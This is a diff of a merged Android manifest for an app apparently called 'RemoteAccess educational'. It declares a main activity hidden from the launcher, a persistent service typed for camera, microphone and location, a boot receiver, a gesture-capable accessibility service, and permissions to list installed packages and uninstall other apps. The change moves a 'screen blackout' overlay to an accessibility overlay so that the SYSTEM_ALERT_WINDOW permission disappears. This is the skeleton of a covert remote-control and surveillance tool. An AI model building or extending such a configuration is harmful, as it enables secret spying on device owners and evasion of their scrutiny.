@@ -120,20 +120,18 @@
 61-->/home/runner/workspace/app/src/main/AndroidManifest.xml:56:5-77
 61-->/home/runner/workspace/app/src/main/AndroidManifest.xml:56:22-74
 62
-63    <!-- Screen blackout overlay — required to draw over other apps -->
-64    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
-64-->/home/runner/workspace/app/src/main/AndroidManifest.xml:59:5-78
-64-->/home/runner/workspace/app/src/main/AndroidManifest.xml:59:22-75
+63    <!-- Screen blackout uses TYPE_ACCESSIBILITY_OVERLAY — no SYSTEM_ALERT_WINDOW needed -->
+64
 65
 66    <!-- Required to trigger the system uninstall dialog for other apps -->
 67    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
-67-->/home/runner/workspace/app/src/main/AndroidManifest.xml:62:5-82
-67-->/home/runner/workspace/app/src/main/AndroidManifest.xml:62:22-79
+67-->/home/runner/workspace/app/src/main/AndroidManifest.xml:61:5-82
+67-->/home/runner/workspace/app/src/main/AndroidManifest.xml:61:22-79
 68
 69    <!-- Required on Android 11+ to query and list all installed packages -->
 70    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
-70-->/home/runner/workspace/app/src/main/AndroidManifest.xml:65:5-66:53
-70-->/home/runner/workspace/app/src/main/AndroidManifest.xml:65:22-74
+70-->/home/runner/workspace/app/src/main/AndroidManifest.xml:64:5-65:53
+70-->/home/runner/workspace/app/src/main/AndroidManifest.xml:64:22-74
 71
 72    <permission
 72-->[androidx.core:core:1.9.0] /home/runner/.gradle/caches/transforms-3/761d68ccdd62ecb8703967694e2fec50/transformed/core-1.9.0/AndroidManifest.xml:22:5-24:47
@@ -147,27 +145,27 @@
 76-->[androidx.core:core:1.9.0] /home/runner/.gradle/caches/transforms-3/761d68ccdd62ecb8703967694e2fec50/transformed/core-1.9.0/AndroidManifest.xml:26:22-94
 77
 78    <application
-78-->/home/runner/workspace/app/src/main/AndroidManifest.xml:68:5-149:19
+78-->/home/runner/workspace/app/src/main/AndroidManifest.xml:67:5-148:19
 79        android:allowBackup="true"
-79-->/home/runner/workspace/app/src/main/AndroidManifest.xml:69:9-35
+79-->/home/runner/workspace/app/src/main/AndroidManifest.xml:68:9-35
 80        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
 80-->[androidx.core:core:1.9.0] /home/runner/.gradle/caches/transforms-3/761d68ccdd62ecb8703967694e2fec50/transformed/core-1.9.0/AndroidManifest.xml:28:18-86
 81        android:dataExtractionRules="@xml/data_extraction_rules"
-81-->/home/runner/workspace/app/src/main/AndroidManifest.xml:70:9-65
+81-->/home/runner/workspace/app/src/main/AndroidManifest.xml:69:9-65
 82        android:debuggable="true"
 83        android:extractNativeLibs="false"
 84        android:fullBackupContent="@xml/backup_rules"
-84-->/home/runner/workspace/app/src/main/AndroidManifest.xml:71:9-54
+84-->/home/runner/workspace/app/src/main/AndroidManifest.xml:70:9-54
 85        android:icon="@mipmap/ic_launcher"
-85-->/home/runner/workspace/app/src/main/AndroidManifest.xml:72:9-43
+85-->/home/runner/workspace/app/src/main/AndroidManifest.xml:71:9-43
 86        android:label="@string/app_name"
-86-->/home/runner/workspace/app/src/main/AndroidManifest.xml:73:9-41
+86-->/home/runner/workspace/app/src/main/AndroidManifest.xml:72:9-41
 87        android:roundIcon="@mipmap/ic_launcher_round"
-87-->/home/runner/workspace/app/src/main/AndroidManifest.xml:74:9-54
+87-->/home/runner/workspace/app/src/main/AndroidManifest.xml:73:9-54
 88        android:supportsRtl="true"
-88-->/home/runner/workspace/app/src/main/AndroidManifest.xml:75:9-35
+88-->/home/runner/workspace/app/src/main/AndroidManifest.xml:74:9-35
 89        android:theme="@style/Theme.RemoteAccess" >
-89-->/home/runner/workspace/app/src/main/AndroidManifest.xml:76:9-50
+89-->/home/runner/workspace/app/src/main/AndroidManifest.xml:75:9-50
 90
 91        <!--
 92            Main Activity — completely hidden from the app drawer / home screen.
@@ -184,36 +182,36 @@
 103                -p com.remoteaccess.educational
 104        -->
 105        <activity
-105-->/home/runner/workspace/app/src/main/AndroidManifest.xml:93:9-102:20
+105-->/home/runner/workspace/app/src/main/AndroidManifest.xml:92:9-101:20
 106            android:name="com.remoteaccess.educational.MainActivity"
-106-->/home/runner/workspace/app/src/main/AndroidManifest.xml:94:13-41
+106-->/home/runner/workspace/app/src/main/AndroidManifest.xml:93:13-41
 107            android:enabled="true"
-107-->/home/runner/workspace/app/src/main/AndroidManifest.xml:95:13-35
+107-->/home/runner/workspace/app/src/main/AndroidManifest.xml:94:13-35
 108            android:exported="true"
-108-->/home/runner/workspace/app/src/main/AndroidManifest.xml:96:13-36
+108-->/home/runner/workspace/app/src/main/AndroidManifest.xml:95:13-36
 109            android:launchMode="singleTop" >
-109-->/home/runner/workspace/app/src/main/AndroidManifest.xml:97:13-43
+109-->/home/runner/workspace/app/src/main/AndroidManifest.xml:96:13-43
 110            <intent-filter>
-110-->/home/runner/workspace/app/src/main/AndroidManifest.xml:98:13-101:29
+110-->/home/runner/workspace/app/src/main/AndroidManifest.xml:97:13-100:29
 111                <action android:name="com.remoteaccess.educational.LAUNCH" />
-111-->/home/runner/workspace/app/src/main/AndroidManifest.xml:99:17-78
-111-->/home/runner/workspace/app/src/main/AndroidManifest.xml:99:25-75
+111-->/home/runner/workspace/app/src/main/AndroidManifest.xml:98:17-78
+111-->/home/runner/workspace/app/src/main/AndroidManifest.xml:98:25-75
 112
 113                <category android:name="android.intent.category.DEFAULT" />
-113-->/home/runner/workspace/app/src/main/AndroidManifest.xml:100:17-76
-113-->/home/runner/workspace/app/src/main/AndroidManifest.xml:100:27-73
+113-->/home/runner/workspace/app/src/main/AndroidManifest.xml:99:17-76
+113-->/home/runner/workspace/app/src/main/AndroidManifest.xml:99:27-73
 114            </intent-filter>
 115        </activity>
 116
 117        <!-- Consent Activity -->
 118        <activity
-118-->/home/runner/workspace/app/src/main/AndroidManifest.xml:105:9-108:40
+118-->/home/runner/workspace/app/src/main/AndroidManifest.xml:104:9-107:40
 119            android:name="com.remoteaccess.educational.ConsentActivity"
-119-->/home/runner/workspace/app/src/main/AndroidManifest.xml:106:13-44
+119-->/home/runner/workspace/app/src/main/AndroidManifest.xml:105:13-44
 120            android:enabled="true"
-120-->/home/runner/workspace/app/src/main/AndroidManifest.xml:107:13-35
+120-->/home/runner/workspace/app/src/main/AndroidManifest.xml:106:13-35
 121            android:exported="false" />
-121-->/home/runner/workspace/app/src/main/AndroidManifest.xml:108:13-37
+121-->/home/runner/workspace/app/src/main/AndroidManifest.xml:107:13-37
 122
 123        <!--
 124            Background Service
@@ -221,36 +219,36 @@
 126            service may use so Android 14 doesn't kill it mid-operation.
 127        -->
 128        <service
-128-->/home/runner/workspace/app/src/main/AndroidManifest.xml:115:9-119:83
+128-->/home/runner/workspace/app/src/main/AndroidManifest.xml:114:9-118:83
 129            android:name="com.remoteaccess.educational.services.RemoteAccessService"
-129-->/home/runner/workspace/app/src/main/AndroidManifest.xml:116:13-57
+129-->/home/runner/workspace/app/src/main/AndroidManifest.xml:115:13-57
 130            android:enabled="true"
-130-->/home/runner/workspace/app/src/main/AndroidManifest.xml:117:13-35
+130-->/home/runner/workspace/app/src/main/AndroidManifest.xml:116:13-35
 131            android:exported="false"
-131-->/home/runner/workspace/app/src/main/AndroidManifest.xml:118:13-37
+131-->/home/runner/workspace/app/src/main/AndroidManifest.xml:117:13-37
 132            android:foregroundServiceType="dataSync|camera|microphone|location" />
-132-->/home/runner/workspace/app/src/main/AndroidManifest.xml:119:13-80
+132-->/home/runner/workspace/app/src/main/AndroidManifest.xml:118:13-80
 133
 134        <!-- Boot Receiver -->
 135        <receiver
-135-->/home/runner/workspace/app/src/main/AndroidManifest.xml:122:9-131:20
+135-->/home/runner/workspace/app/src/main/AndroidManifest.xml:121:9-130:20
 136            android:name="com.remoteaccess.educational.receivers.BootReceiver"
-136-->/home/runner/workspace/app/src/main/AndroidManifest.xml:123:13-51
+136-->/home/runner/workspace/app/src/main/AndroidManifest.xml:122:13-51
 137            android:enabled="true"
-137-->/home/runner/workspace/app/src/main/AndroidManifest.xml:124:13-35
+137-->/home/runner/workspace/app/src/main/AndroidManifest.xml:123:13-35
 138            android:exported="true" >
-138-->/home/runner/workspace/app/src/main/AndroidManifest.xml:125:13-36
+138-->/home/runner/workspace/app/src/main/AndroidManifest.xml:124:13-36
 139            <intent-filter>
-139-->/home/runner/workspace/app/src/main/AndroidManifest.xml:126:13-130:29
+139-->/home/runner/workspace/app/src/main/AndroidManifest.xml:125:13-129:29
 140                <action android:name="android.intent.action.BOOT_COMPLETED" />
-140-->/home/runner/workspace/app/src/main/AndroidManifest.xml:127:17-79
-140-->/home/runner/workspace/app/src/main/AndroidManifest.xml:127:25-76
+140-->/home/runner/workspace/app/src/main/AndroidManifest.xml:126:17-79
+140-->/home/runner/workspace/app/src/main/AndroidManifest.xml:126:25-76
 141                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
-141-->/home/runner/workspace/app/src/main/AndroidManifest.xml:128:17-84
-141-->/home/runner/workspace/app/src/main/AndroidManifest.xml:128:25-81
+141-->/home/runner/workspace/app/src/main/AndroidManifest.xml:127:17-84
+141-->/home/runner/workspace/app/src/main/AndroidManifest.xml:127:25-81
 142                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
-142-->/home/runner/workspace/app/src/main/AndroidManifest.xml:129:17-82
-142-->/home/runner/workspace/app/src/main/AndroidManifest.xml:129:25-79
+142-->/home/runner/workspace/app/src/main/AndroidManifest.xml:128:17-82
+142-->/home/runner/workspace/app/src/main/AndroidManifest.xml:128:25-79
 143            </intent-filter>
 144        </receiver>
 145
@@ -259,26 +257,26 @@
 148            canPerformGestures="true" is required for touch/swipe commands.
 149        -->
 150        <service
-150-->/home/runner/workspace/app/src/main/AndroidManifest.xml:137:9-147:19
+150-->/home/runner/workspace/app/src/main/AndroidManifest.xml:136:9-146:19
 151            android:name="com.remoteaccess.educational.services.UnifiedAccessibilityService"
-151-->/home/runner/workspace/app/src/main/AndroidManifest.xml:138:13-65
+151-->/home/runner/workspace/app/src/main/AndroidManifest.xml:137:13-65
 152            android:exported="false"
-152-->/home/runner/workspace/app/src/main/AndroidManifest.xml:140:13-37
+152-->/home/runner/workspace/app/src/main/AndroidManifest.xml:139:13-37
 153            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
-153-->/home/runner/workspace/app/src/main/AndroidManifest.xml:139:13-79
+153-->/home/runner/workspace/app/src/main/AndroidManifest.xml:138:13-79
 154            <intent-filter>
-154-->/home/runner/workspace/app/src/main/AndroidManifest.xml:141:13-143:29
+154-->/home/runner/workspace/app/src/main/AndroidManifest.xml:140:13-142:29
 155                <action android:name="android.accessibilityservice.AccessibilityService" />
-155-->/home/runner/workspace/app/src/main/AndroidManifest.xml:142:17-92
-155-->/home/runner/workspace/app/src/main/AndroidManifest.xml:142:25-89
+155-->/home/runner/workspace/app/src/main/AndroidManifest.xml:141:17-92
+155-->/home/runner/workspace/app/src/main/AndroidManifest.xml:141:25-89
 156            </intent-filter>
 157
 158            <meta-data
-158-->/home/runner/workspace/app/src/main/AndroidManifest.xml:144:13-146:72
+158-->/home/runner/workspace/app/src/main/AndroidManifest.xml:143:13-145:72
 159                android:name="android.accessibilityservice"
-159-->/home/runner/workspace/app/src/main/AndroidManifest.xml:145:17-60
+159-->/home/runner/workspace/app/src/main/AndroidManifest.xml:144:17-60
 160                android:resource="@xml/accessibility_service_config" />
-160-->/home/runner/workspace/app/src/main/AndroidManifest.xml:146:17-69
+160-->/home/runner/workspace/app/src/main/AndroidManifest.xml:145:17-69
 161        </service>
 162
 163        <activity
@@ -455,8 +453,8 @@
 251            <intent-filter>
 251-->[androidx.work:work-runtime:2.9.0] /home/runner/.gradle/caches/transforms-3/0a9eb2c9a2d3059ada8836ef93397586/transformed/work-runtime-2.9.0/AndroidManifest.xml:116:13-120:29
 252                <action android:name="android.intent.action.BOOT_COMPLETED" />
-252-->/home/runner/workspace/app/src/main/AndroidManifest.xml:127:17-79
-252-->/home/runner/workspace/app/src/main/AndroidManifest.xml:127:25-76
+252-->/home/runner/workspace/app/src/main/AndroidManifest.xml:126:17-79
+252-->/home/runner/workspace/app/src/main/AndroidManifest.xml:126:25-76
 253                <action android:name="android.intent.action.TIME_SET" />
 253-->[androidx.work:work-runtime:2.9.0] /home/runner/.gradle/caches/transforms-3/0a9eb2c9a2d3059ada8836ef93397586/transformed/work-runtime-2.9.0/AndroidManifest.xml:118:17-73
 253-->[androidx.work:work-runtime:2.9.0] /home/runner/.gradle/caches/transforms-3/0a9eb2c9a2d3059ada8836ef93397586/transformed/work-runtime-2.9.0/AndroidManifest.xml:118:25-70
